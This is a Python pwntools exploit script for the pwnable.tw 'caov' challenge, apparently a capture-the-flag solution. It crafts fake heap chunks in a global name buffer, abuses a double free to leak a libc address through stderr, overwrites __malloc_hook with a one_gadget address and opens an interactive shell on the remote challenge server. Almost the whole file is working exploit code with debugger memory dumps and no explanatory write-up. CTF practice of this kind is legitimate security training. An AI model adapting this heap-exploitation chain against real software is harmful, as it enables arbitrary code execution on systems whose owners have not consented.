#!/usr/bin/env python3

from pwn import *

exe = ELF("./caov_patched",checksec=False)
libc = ELF("./libc_64.so.6",checksec=False)
ld = ELF("./ld-2.23.so",checksec=False)

context.binary = exe

def GDB():
    gdb.attach(p,gdbscript='''
   # b*0x401396
   # b*0x401D70
   # b*0x4015A0
   # b*0x4014B0
   # b*0x40152C
   # b*0x4014E9
   # b*0x401E6A
   # b*0x401b1a
   # b*0x401c52
   # b*0x401cc4
    # call localtime
    b*0x401cf4
    c
    ''')
    input()

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10306 )
else:
    p = process([exe.path])
    #GDB()

name_add = 0x6032C0
def setname(name):
    p.sendlineafter(b"Enter your name: ",name)

def edit(name,newLenKey,key,value):
    p.sendlineafter(b"Your choice:",b"2")
    p.sendlineafter(b"Enter your name:",name)
    p.sendlineafter("New key length: ",f"{newLenKey}".encode())
    p.sendlineafter(b'Key: ',key)
    p.sendlineafter(b"Value: ",value)

# DATA=0x6032A0
name=b"BATMAN"
setname(name)
key,value =  b"ABCDEF",f"{0x21}".encode()
p.sendlineafter(b"Please input a key: ",key)
p.sendlineafter(b"Please input a value: ",value)

'''
0x603285 <stderr+5>:    0x8a2dccd62000007f      0x000000000000007f
0x603295:       0x0000000000000000      0x0000fadc20000000
0x6032a5:       0x0000000000000000      0x0000000000000000
0x6032b5:       0x0000000000000000      0x0000000000000000
0x6032c5:       0x0000000071000000      0x0000000000000000
0x6032d5:       0x4141414141000000      0x4141414141414141
0x6032e5:       0x4141414141414141      0x4141414141414141
0x6032f5:       0x4141414141414141      0x0000000000414141
0x603305:       0x0000000021000000      0x4141414141000000
0x603315:       0x4141414141414141      0x00006032d0414141
'''

'''
DATA_CLASS -> stderr = day + hour
0x603260 <_ZSt4cout+256>:       0x00007fe8b1c27050      0x00007fe8b1c27060
0x603270:       0x0000000000000000      0x0000000000000000
0x603280 <stderr>:      0x00007fe8b1683540      0x00007fe8b1683620
'''
########## double free ####################################
fakechunk = flat(0x603285)
name=flat(0,0x71)
name=name.ljust(0x40,b"A")+flat(0,0x21)
name=name.ljust(96,b"A")+flat(name_add+0x10)+b"A"*8+flat(0,0x21)
edit(name,0x8,b"BATMAN",f"{0xdeadbeef}".encode())
name=flat(
    0,0x71,
    fakechunk,
)

edit(name,0x67,b"123",f"{0xdeadbeef}".encode())


name=flat(0,0x71,fakechunk)
name=name.ljust(0x40,b"\x00")+flat(0,0x21)
name=name.ljust(96,b"\x00")+flat(0)+b"A"*8+flat(0,0x21)
edit(name,0x8,b"BATMAN",f"{0xdeadbeef}".encode())
name=flat(
    0,0x71,
    fakechunk,
)
edit(name,0x67,flat(fakechunk),f"{0xdeadbeef}".encode()) 

input("free2")
name=flat(0,0x71)
name=name.ljust(0x40,b"\x00")+flat(0,0x21)
name=name.ljust(96,b"\x00")+flat(name_add+0x10)+b"A"*8+flat(0,0x21)
edit(name,0x8,b"BATMAN",f"{0xdeadbeef}".encode())

name=flat(0,0x71,fakechunk)
name=name.ljust(0x40,b"\x00")+flat(0,0x21)
name=name.ljust(96,b"\x00")+flat(0)+b"A"*8+flat(0,0x21)
edit(name,0x8,b"BATMAN",f"{0xdeadbeef}".encode())
name=flat(
    0,0x71,
    fakechunk,
)
edit(name,0x67,flat(0),f"{0xdeadbeef}".encode())
############################################################## 
LEAK = flat(name_add)+b"\x00"*3+flat(name_add+0x20)
fakeStructData = flat(exe.sym['stderr'],0,0,0,0,0)
name=flat(0,0x71,0,0)+fakeStructData
edit(name,0x67,LEAK,f"{0x71}".encode())

p.recvuntil(b"our data info after editing:")
p.recvuntil(b"Key: ")

stderr = int.from_bytes(p.recvline()[:-1],"little")
log.info('[+] STDERR:'+hex(stderr))
libc.address = stderr - 0x3c4540
log.info('[+]LIBC BASE:'+hex(libc.address))

fakeStructData = flat(exe.sym['stderr'],0,0,0,)
name=flat(0,0x71,libc.sym['__malloc_hook']-35,0)+fakeStructData
edit(name,0x67,LEAK,f"{0x71}".encode())

edit(name,0x67,flat(0,0),f"{1337}".encode())

#GDB()
one = [0x45216,0x4526a,0xef6c4,0xf0567]
name = flat(0,0x71,0,0)
log.info('[+]one gadget:'+hex(libc.address+one[2]))
edit(name,0x66,b"\x00"*19+flat(libc.address+one[2]),f"{1337}".encode())

p.interactive()
